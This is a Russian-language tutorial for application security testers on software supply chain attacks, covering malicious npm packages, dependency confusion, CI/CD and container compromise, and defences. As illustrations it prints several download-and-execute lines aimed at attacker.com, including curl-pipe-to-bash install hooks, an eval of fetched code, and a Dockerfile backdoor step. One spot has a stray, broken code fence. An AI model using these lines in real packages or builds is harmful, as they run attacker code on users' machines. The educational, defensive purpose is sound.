# 4. Software supply chain failures
# Software supply chain failures (Уязвимости цепочки поставок программного обеспечения)

## 1. Что такое Software supply chain failures

**Software supply chain failures** — это класс уязвимостей, связанных с нарушением безопасности на любом этапе жизненного цикла программного обеспечения: от разработки исходного кода до доставки готового приложения пользователю.

Современное программное обеспечение редко создаётся полностью самостоятельно. Большинство приложений используют:

* сторонние библиотеки;
* открытые пакеты;
* контейнерные образы;
* CI/CD-системы;
* системы сборки;
* плагины;
* внешние API;
* инструменты разработчика;
* облачную инфраструктуру.

Таким образом, конечное приложение зависит от большого количества внешних компонентов. Если один из этих компонентов оказывается скомпрометирован, злоумышленник может атаковать все системы, которые используют этот компонент.

Упрощённо цепочку поставки ПО можно представить следующим образом:

```
Разработчик
     |
     ↓
Исходный код
     |
     ↓
Зависимости (npm, pip, Maven, NuGet)
     |
     ↓
Система сборки (CI/CD)
     |
     ↓
Артефакт (Docker image, binary)
     |
     ↓
Репозиторий
     |
     ↓
Конечный пользователь
```

Атака может произойти на любом из этих этапов.

---

# 2. Почему Software supply chain attacks опасны

## 2.1 Масштаб воздействия

Главная особенность таких атак — **эффект распространения**.

Если злоумышленник компрометирует популярный пакет, то атакованы могут быть тысячи организаций одновременно.

Например:

```
Уязвимая библиотека

        ↓

1000 проектов используют библиотеку

        ↓

1000 приложений становятся потенциально уязвимыми
```

В отличие от обычной атаки на один сервер, атака на цепочку поставок позволяет получить доступ сразу к большому числу целей.

---

## 2.2 Сложность обнаружения

Проблема заключается в том, что вредоносный код часто выглядит как обычное обновление.

Например:

Разработчик устанавливает зависимость:

```bash
npm install some-library
```

На первый взгляд:

```
some-library@1.4.2
```

выглядит нормально.

Но внутри:

```javascript
const https = require("https");

https.get(
 "https://attacker.com/payload",
 function(response){
     eval(response)
 }
);
```

Библиотека выполняет загрузку и запуск удалённого кода.

Для разработчика это выглядит как обычный пакет.

---

## 2.3 Высокий потенциал ущерба

Компрометация цепочки поставок может привести к:

* краже секретов;
* компрометации серверов;
* внедрению backdoor;
* утечке исходного кода;
* атаке на клиентов;
* распространению вредоносных обновлений.

# 3. Основные виды атак Software Supply Chain

---

# 3.1 Компрометация сторонних зависимостей

Один из наиболее распространённых вариантов.

Приложение использует внешнюю библиотеку:

```
Application

 ├── framework
 ├── database driver
 ├── logging library
 └── vulnerable-library
```

Если библиотека содержит вредоносный код — приложение становится заражено.

---

## Пример: вредоносный пакет npm

Допустим, разработчик устанавливает:

```bash
npm install useful-package
```

Внутри package.json:

```json
{
 "scripts": {
   "postinstall": "node install.js"
 }
}
```

После установки автоматически выполняется:

```javascript
// install.js

const {exec}=require("child_process");

exec(
 "curl http://attacker.com/script.sh | bash"
);
```

Теперь установка зависимости приводит к выполнению команд атакующего.

```

Пример:

```

---

### Java

Maven:

```bash
mvn dependency-check:check
```

## Анализ Burp Suite

При тестировании веб-приложения:

Смотрим:

```
HTTP Response

Server:
Apache/2.4.49

X-Powered-By:
Express

Generator:
webpack
```

Ищем:

* версии фреймворков;
* JS-библиотеки;
* CDN зависимости.

Например:

```html
<script src="/static/jquery-3.3.1.min.js">
</script>
```

Проверяем:

```
jquery 3.3.1 vulnerabilities
```

# 3.2 Dependency Confusion (подмена зависимости)

Очень интересная атака.

Суть:

Компания использует внутренний пакет:

```
company-auth-lib
```

Но он отсутствует в публичном репозитории.

Например:

```
npm registry:

company-auth-lib
```

нет.

Внутри компании:

```
package.json

{
 "dependencies":
 {
   "company-auth-lib":"1.0.0"
 }
}
```

Атакующий создаёт публичный пакет:

```
company-auth-lib
version 9.0.0
```

И система случайно скачивает его из интернета.

---

## Пример payload

Вредоносный package.json:

```json
{
"name":"company-auth-lib",
"version":"9.0.0",

"scripts":
{
"preinstall":
"curl attacker.com/a.sh | bash"
}
}
```

При сборке:

```
npm install
```

происходит:

```
download public package

        ↓

execute preinstall

        ↓

server compromised
```

---

# Поиск Dependency Confusion

Проверяем:

* package.json;
* requirements.txt;
* pom.xml;
* go.mod.

Ищем внутренние имена:

Пример:

```
corp-payment-sdk
internal-utils
company-security
```

Проверяем:

```
npm search corp-payment-sdk
```

Если такого пакета нет публично — риск.

---

# Защита

Использовать приватные registry:

Например:

```
npm.company.local
```

и запрещать:

```
public npm registry
```

# 3.3 Компрометация CI/CD pipeline

CI/CD часто имеет высокие права:

```
GitHub Actions

       |
       ↓

Build server

       |
       ↓

Production deployment
```

Если атакующий получает доступ к pipeline:

он может изменить процесс сборки.

---

## Пример уязвимого GitHub Actions

Файл:

```
.github/workflows/build.yml
```

Содержит:

```yaml
steps:

- uses:
    actions/checkout@v2

- run:
    npm install

- run:
    npm build
```

Проблема:

используется старая версия action.

Атакующий может внедрить код через зависимость.

---

# Поиск проблем CI/CD

Проверяем:

## GitHub Actions

Файлы:

```
.github/workflows/*.yml
```

Ищем:

опасные конструкции:

```yaml
pull_request_target
```

или:

```yaml
permissions:
 contents: write
```

---

## Секреты в pipeline

Плохо:

```yaml
env:

 AWS_KEY:
  AKIAxxxxxxxx
```

Хорошо:

```
GitHub Secrets

AWS_KEY=${{ secrets.AWS_KEY }}
```

---

# 3.4 Компрометация контейнерных образов

Современные приложения используют:

```
Dockerfile

     ↓

Docker image

     ↓

Container Registry
```

Если образ заражён:

все пользователи получают вредоносный контейнер.

---

## Пример

Dockerfile:

```dockerfile
FROM ubuntu:latest

RUN apt update

RUN curl attacker.com/backdoor.sh | bash

COPY app /
```

После сборки:

```
docker build .
```

образ уже заражён.

---

# Поиск уязвимых образов

Используются:

## Trivy

```bash
trivy image nginx:latest
```

Результат:

```
HIGH:

openssl

CVE-2024-xxxx

```

---

## Проверка Dockerfile

Опасные места:

```dockerfile
ADD http://example.com/file /
```

или:

```dockerfile
RUN curl URL | bash
```

# 4. Практический сценарий поиска в веб-приложении

Допустим есть:

```
https://example.com
```

Пентестер начинает анализ.

---

## Шаг 1. Определение технологий

Burp:

```
HTTP history
```

Смотрим:

```
Server:
nginx

X-Powered-By:
Express
```

---

## Шаг 2. Анализ JavaScript

Находим:

```
/static/app.js
```

Внутри:

```javascript
React.version="17.0.1"
```

Проверяем:

```
React 17.0.1 vulnerabilities
```

---

## Шаг 3. Поиск зависимостей

Ищем:

```
package.json

package-lock.json

yarn.lock
```

Например:

```json
{
"dependencies":
{
 "axios":"0.21.0",
 "lodash":"4.17.15"
}
}
```

Проверяем:

```
npm audit
```

---

## Шаг 4. Проверка загрузки обновлений

Ищем:

```
/api/update
/download/latest
/check-version
```

Проверяем:

Запрос:

```
GET /api/update
```

Ответ:

```json
{
"version":"1.2.3",
"url":
"https://example.com/app.exe"
}
```

Если URL можно изменить:

```
https://attacker.com/app.exe
```

может появиться возможность подмены обновления.

# 5. Методы защиты

## 5.1 Управление зависимостями

Использовать:

* Software Composition Analysis (SCA);
* автоматический аудит;
* фиксацию версий.

Плохо:

```json
"lodash":"latest"
```

Хорошо:

```json
"lodash":"4.17.21"
```

---

# 5.2 Подпись компонентов

Использовать:

* цифровые подписи;
* проверку целостности;
* SBOM.

SBOM:

Software Bill of Materials

Это список всех компонентов приложения:

```
Application

├── nginx 1.24
├── openssl 3.0
├── react 18
└── lodash 4.17
```

---

# 5.3 Безопасность CI/CD

Необходимо:

* MFA для репозиториев;
* минимальные права;
* защита секретов;
* проверка pull request.

---

# 5.4 Безопасность контейнеров

Использовать:

* сканирование образов;
* минимальные базовые образы;
* подпись Docker images.

Например:

```
Developer

↓

Sign image

↓

Registry

↓

Production verifies signature
```

---

# 5.5 Контроль обновлений

Обновления должны:

* подписываться;
* проверяться;
* доставляться через доверенный канал.

# Итог

Software supply chain failures — это не одна конкретная уязвимость, а класс проблем, возникающих из-за доверия к внешним компонентам и процессам разработки.

Основные направления анализа:

1. Проверка зависимостей.
2. Поиск Dependency Confusion.
3. Анализ CI/CD.
4. Проверка контейнерных образов.
5. Контроль процесса обновления.

Для AppSec специалиста главная задача — не только искать CVE в коде, а понимать всю цепочку создания программного обеспечения и выявлять места, где злоумышленник может внедрить свой код до момента попадания приложения в production.
